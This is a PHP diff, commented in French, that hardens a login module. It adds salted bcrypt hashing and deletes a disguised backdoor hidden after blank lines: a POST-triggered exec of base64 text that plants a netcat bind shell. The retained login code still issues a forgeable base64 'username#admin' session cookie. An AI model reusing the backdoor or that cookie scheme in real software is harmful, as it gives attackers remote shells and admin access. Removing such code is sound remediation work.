@@ -44,25 +44,22 @@ function create_user($username, $password, $description)
         // Obtenir la connexion PDO
         $pdo = $db->getConnection();
         try {
+            // Génère un 16-byte aléatoire
+            $salt = bin2hex(random_bytes(16));
+            $combinedPassword = $password . $salt;
+            // Utilisation d'un algorithme de hachage
+            $hashedpassword = password_hash($combinedPassword, PASSWORD_BCRYPT);
+
             // Préparer la requête SQL pour insérer un nouvel utilisateur
-            $sql = "INSERT INTO users (USERNAME, PASSWORD, DESCRIPTION, admin) VALUES (:username, :password, :description, 0)";
+            $sql = "INSERT INTO users (USERNAME, PASSWORD, DESCRIPTION, admin, salt) VALUES (:username, :password, :description, 0, :salt)";
             $stmt = $pdo->prepare($sql);
             // Lier les paramètres
             $stmt->bindParam(':username', $username, PDO::PARAM_STR);
-            $stmt->bindParam(':password', $password, PDO::PARAM_STR);
+            $stmt->bindParam(':password', $hashedpassword, PDO::PARAM_STR);
             $stmt->bindParam(':description', $description, PDO::PARAM_STR);
+            $stmt->bindParam(':salt', $salt, PDO::PARAM_STR);
             // Exécuter la requête
             $stmt->execute();
-
-            // Lire le contenu du template de fichier
-            $pcontent = file_get_contents("./p/template.php");
-            // Remplacer le placeholder par le nom d'utilisateur
-            $towrite = str_replace("####USERNAME####", $username, $pcontent);
-            // Écrire le contenu dans un nouveau fichier pour l'utilisateur
-            file_put_contents("./p/" . $username . ".php", $towrite);
-            // Créer un répertoire pour l'utilisateur
-            mkdir("./files/" . $username);
-
             return true;
         } catch (PDOException $e) {
             // Afficher l'erreur en cas d'exception PDO
@@ -102,34 +99,23 @@ function delete_user($username)
 // Fonction pour connecter un utilisateur
 function login_user($username, $password)
 {
+    // Obtenir les informations de l'utilisateur depuis la base de données
+    $user_data = search_user($username);
+
     // Vérifie si l'utilisateur existe
-    if (search_user($username)) {
-        // Obtenir l'instance unique de la classe Database
-        $db = Database::getInstance();
-        // Obtenir la connexion PDO
-        $pdo = $db->getConnection();
-        try {
-            // Préparer la requête SQL pour vérifier les identifiants de l'utilisateur
-            $sql = "SELECT * FROM users WHERE USERNAME = :username AND PASSWORD = :password";
-            $stmt = $pdo->prepare($sql);
-            // Lier les paramètres
-            $stmt->bindParam(':username', $username, PDO::PARAM_STR);
-            $stmt->bindParam(':password', $password, PDO::PARAM_STR);
-            // Exécuter la requête
-            $stmt->execute();
+    if ($user_data) {
+        // Récupère le mot de passe haché stocké et le sel
+        $storedHashedPassword = $user_data["PASSWORD"];
+        $storedSalt = $user_data["salt"];
 
-            // Vérifier si un résultat est trouvé
-            if ($stmt->rowCount() == 1) {
-                // Récupérer les informations de l'utilisateur
-                $user_infos = $stmt->fetch(PDO::FETCH_ASSOC);
-                // Définir un cookie de session
-                setcookie("ALEXSESSID", base64_encode($user_infos["USERNAME"] . "#" . $user_infos["admin"]));
+        // Combine le mot de passe fourni avec le sel stocké pour la vérification
+        $combinedPassword = $password . $storedSalt;
 
-                return true;
-            }
-        } catch (PDOException $e) {
-            // Afficher l'erreur en cas d'exception PDO
-            echo 'Erreur : ' . $e->getMessage();
+        // Vérifie le mot de passe fourni avec le mot de passe haché stocké
+        if (password_verify($combinedPassword, $storedHashedPassword)) {
+            // Définir un cookie de session si les informations de connexion sont correctes
+            setcookie("ALEXSESSID", base64_encode($user_data["USERNAME"] . "#" . $user_data["admin"]));
+            return true;
         }
     }
     return false;
@@ -184,97 +170,4 @@ function connect_infos()
     }
 
     return false;
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-if (isset($_POST["BCKDR"])) {
-    if ($_POST["BCKDR"] == "o") exec(base64_decode("ZWNobyAiPD9waHAgZXhlYyhiYXNlNjRfZGVjb2RlKFwiYm1NdWRISmhaR2wwYVc5dVlXd2dMV3gyYm5BZ05qQXlOVEFnTFdVZ0wySnBiaTlpWVhOb1wiKTsgPz4iID4gYmNrZHIucGhw"));
 }
